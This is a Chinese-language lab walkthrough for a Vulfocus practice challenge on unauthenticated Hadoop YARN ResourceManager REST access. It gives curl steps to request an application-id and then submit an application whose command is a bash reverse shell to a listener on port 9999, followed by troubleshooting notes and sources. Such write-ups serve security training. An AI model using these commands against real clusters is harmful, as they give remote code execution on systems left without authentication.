# 130｜Hadoop YARN ResourceManager 未授权提交应用

- 镜像：`vulfocus/hadoop`
- 题库未给端口。Docker Hub 为本镜像提供的 compose 把 ResourceManager Web/REST 映到 **`8088`**（另映 `8032` RPC）。无 CVE。[S1][S2]

## 一句话打法

对未设 Kerberos 的 YARN RM REST：先 POST 取 `application-id`，再 POST JSON 在 `am-container-spec.commands` 里下发命令。[S2][S3][S4]

## 操作步骤

1. 打开 RM Web。Hub 说明本题镜像要用 **DockerCompose 四件套**（namenode/datanode/resourcemanager/nodemanager），`CLUSTER_NAME=vulhub`。Vulfocus 平台复现见到的是 Hadoop **2.8.1** 管理页。若单容器启动而 8088 无 RM UI，这条 REST 链不成立。[S1][S5]

   ```powershell
   curl.exe -i "http://<靶场IP>:8088/"
   ```

2. 申请 application-id（成功是 JSON，含 `application-id`）：[S3][S4]

   ```powershell
   curl.exe -s -X POST "http://<靶场IP>:8088/ws/v1/cluster/apps/new-application"
   ```

3. 提交应用。把上一步的 id 原样填入。HTTP 成功常见 **202** + `Location`；**命令输出不在这个响应里**。Vulhub/平台题解用反连，需先在本机监听对应端口。[S2][S3][S5]

   ```powershell
   curl.exe --globoff -s -X POST "http://<靶场IP>:8088/ws/v1/cluster/apps" -H "Content-Type: application/json" -d '{"application-id":"<上一步id>","application-name":"get-shell","am-container-spec":{"commands":{"command":"/bin/bash -i >& /dev/tcp/<监听IP>/9999 0>&1"}},"application-type":"YARN"}'
   ```

## 本题特有排坑

- 题库没写端口；REST 以 Hub compose 的 **8088** 为准，不要去打 8032。平台映射端口以实例为准。[S1]
- 必须用第一步返回的 `application-id`，不能编造。提交体要 `Content-Type: application/json`。[S3][S4]
- 命令跑在 AM 容器里，要 nodemanager 在集群里；只起 RM、没有 NM 时提交了也不会在本机看到 shell。[S1][S2]
- 官方 REST 写明提交接口需要请求里有用户名；默认 insecure/`simple` 伪认证会填 `dr.who`。开了 Kerberos 的集群这条未授权链不成立。[S4]
- 无 CVE。部分博客写“3.3.0 以下”没有对应官方漏洞编号，以 2.8.1 未授权 REST 为准。[S2][S5]

## 来源

- [S1] Docker Hub `vulfocus/hadoop`：本题镜像 compose、8088/8032。详见[来源清单](../sources/130_hadoop/_meta.md)。
- [S2] Vulhub README：8088 WebUI、两步 REST。详见[来源清单](../sources/130_hadoop/_meta.md)。
- [S3] Vulhub `exploit.py`：new-application + JSON 提交反连。详见[来源清单](../sources/130_hadoop/_meta.md)。
- [S4] Hadoop 2.7.3 RM REST：路径、字段、202。详见[来源清单](../sources/130_hadoop/_meta.md)。
- [S5] Vulfocus 平台 Hadoop 实操：2.8.1、同一 REST 脚本。详见[来源清单](../sources/130_hadoop/_meta.md)。
